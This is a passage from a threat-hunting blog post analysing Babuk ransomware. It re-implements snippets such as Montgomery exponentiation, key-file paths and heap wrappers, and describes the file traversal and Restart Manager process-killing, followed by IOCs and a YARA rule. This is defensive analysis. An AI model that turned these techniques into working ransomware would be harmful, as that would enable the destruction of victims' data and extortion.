  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;prod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;montgomery_pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1ULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;xR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;montgomery_mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;montgomery_mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;montgomery_mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;montgomery_pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// outputs: 8&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Path traversing logic&lt;/strong&gt; - In order to explore and encrypt files, Babuk employs a process known as recursion, as was just mentioned. It navigates through each directory by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindFirstFileW&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindNextFileW&lt;/code&gt; methods in order to search for files and subdirectories.&lt;/p&gt;

&lt;p&gt;When it comes across a directory, it calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_encrypt&lt;/code&gt; method multiple times in a recursive manner. However, because Babuk only goes down &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;16&lt;/code&gt; directory layers deep, there is a possibility that it might not encrypt each and every folder on the drive in order to save time.&lt;/p&gt;

&lt;p&gt;When it comes across a file, it will perform a check to see if the file name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;How To Restore Your data.txt&lt;/code&gt; or if the file extension is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__NIST_K571__&lt;/code&gt;. This is done to prevent it from encrypting the ransom note or the data that have already been encrypted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/5/2023-06-15_20-05.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;babuk-decryption&quot;&gt;Babuk decryption&lt;/h3&gt;

&lt;p&gt;In order for Babuk to be able to decrypt files, the local public key is saved in the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ecdh_pub_k.bin&lt;/code&gt;, which is located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APPDATA&lt;/code&gt; folder, something like this re-implementation:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;GetEnvironmentVariableW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;APPDATA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pubkeypath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;lstrcatW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pubkeypath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ecdh_pub_k.bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Killing processes that are using files&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In a manner that is analogous to that of the ransomware known as Conti or REvil, Babuk employs the Windows Restart Manager to end any process that is consuming files. This makes sure that there is nothing that can stop it from opening the files and encrypting them:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RmStartSession&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RmRegisterResources&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RmGetList&lt;/code&gt; are the calls that must be made in order to fulfill this goal of retrieving a list of processes that are utilizing a particular file. Babuk will attempt to terminate the process by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TerminateProcess&lt;/code&gt; if the process in question is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; or a critical process.&lt;/p&gt;

&lt;h3 id=&quot;utils&quot;&gt;Utils&lt;/h3&gt;

&lt;p&gt;Also re-implementing some utilities for tricks used in Babuk ransomware.&lt;/p&gt;

&lt;p&gt;Checks if the process is running on a 64 bit machine:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;myIsWow64Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bIsWow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetModuleHandleA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kernel32.dll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;pdef_IsWow64Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IsWow64Process_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdef_IsWow64Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;IsWow64Process&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsWow64Process_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsWow64Process_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bIsWow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;bIsWow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bIsWow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HeapAlloc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HeapFree&lt;/code&gt; wrappers:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;myHeapAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EnterCriticalSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;critSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpMem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HeapAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessHeap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HEAP_ZERO_MEMORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LeaveCriticalSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;critSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpMem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;myHeapFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;EnterCriticalSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;critSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;HeapFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessHeap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LeaveCriticalSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;critSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;iocs&quot;&gt;IOCs&lt;/h3&gt;

&lt;p&gt;MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e10713a4a5f635767dcd54d609bed977&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;320d799beef673a98481757b2ff7e3463ce67916&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8203c2f00ecd3ae960cb3247a7d7bfb35e55c38939607c85dbdb5c92f0495fa9&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;IPs and domains:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20.99.184.37&lt;/code&gt;   &lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;239.255.255.250&lt;/code&gt;  &lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;babukq4e2p4wu4iq.onion&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;yara-rule&quot;&gt;Yara rule&lt;/h3&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;rule BabukRansom {&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;meta&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;description = &quot;YARA rule for Babuk Ransomware&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;reference = &quot;https://mssplab.github.io/threat-hunting/2023/06/15/malware-analysis-babuk.html&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;author = &quot;@cPeterr&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;date = &quot;2021-01-03&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;rule_version = &quot;v1&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;malware_type = &quot;ransomware&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;tlp = &quot;white&quot;&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$lanstr1 = &quot;-lanfirst&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$lanstr2 = &quot;-lansecond&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$lanstr3 = &quot;-nolan&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$str1 = &quot;BABUK LOCKER&quot;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$str2 = &quot;.__NIST_K571__&quot; wide&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$str3 = &quot;How To Restore Your Files.txt&quot; wide&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$str4 = &quot;ecdh_pub_k.bin&quot; wide&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;all of ($str*) and all of ($lanstr*)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;Babuk&lt;/em&gt; announced their “retirement” at the end of April 2021. However, this does not mean that the threat has disappeared completely. There is concern that members of the group may continue their activities within other groups or under new names. And although the samples we studied were two years old, it is of particular interest to use elliptic curve cryptography in ransomware.&lt;/p&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/madiyar-mukhamadiyev-306b37239/&quot;&gt;@mgmadr&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://attack.mitre.org/software/S0638/&quot;&gt;MITRE ATT&amp;amp;CK: Babuk&lt;/a&gt;      &lt;br /&gt;
